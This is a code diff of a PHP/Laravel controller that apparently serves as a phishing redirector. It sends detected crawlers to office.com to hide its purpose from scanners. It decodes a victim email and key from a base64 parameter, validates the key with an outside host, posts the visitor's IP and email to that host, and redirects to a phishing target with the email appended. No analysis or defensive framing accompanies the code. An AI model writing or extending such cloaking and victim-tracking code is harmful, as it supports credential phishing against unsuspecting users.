@@ -44,27 +44,40 @@ class Controller extends BaseController
         if(Crawler::isCrawler()){
             return redirect()->away("https://office.com");
         }else{
+//            $final = ;
 //            return base64_decode($data->target).base64_decode($data->email);
-            return redirect()->away($data["email"]);
+            return redirect()->away($data["target"].$data["email"]);
 
         }
     }
 
     public function index2(Request $request){
         $decode = base64_decode($request->subs);
-        $target_url  = explode("&",$decode)[0];
-        $key_red  = explode("&",$decode)[1];
-//        return ;
-     $send =   Http::post("https://natrium100gram.site/public/api/savemeking",[
-            "ip" => $this->get_ip(),
-            "subs" => $target_url,
-            "key_red" => $key_red,
-        ]);
-     if ($send->successful()){
-         return "success";
-     }else{
-         return redirect()->away("https://office.com");
-     }
+        $decode2 = explode("#",$decode)[1];
+        $email = explode("&",$decode2)[0];
+        $key_red  = explode("&",$decode2)[1];
+//        return $key_red;
+
+        $key_val = Http::get("https://natrium100gram.site/public/api/validate_key/".$key_red);
+        if ($key_val->successful()){
+            $target = $key_val["url_target"];
+
+            $send =   Http::post("https://natrium100gram.site/public/api/savemeking",[
+                "ip" => $this->get_ip(),
+                "subs" => base64_encode($email) ,
+                "target" => $target,
+            ]);
+            if ($send->successful()){
+                return $send->body();
+            }else{
+                return redirect()->away("https://office.com");
+            }
+
+        }else{
+            return $key_val->status();
+        }
+
+
 //        return $send->body();
 
     }
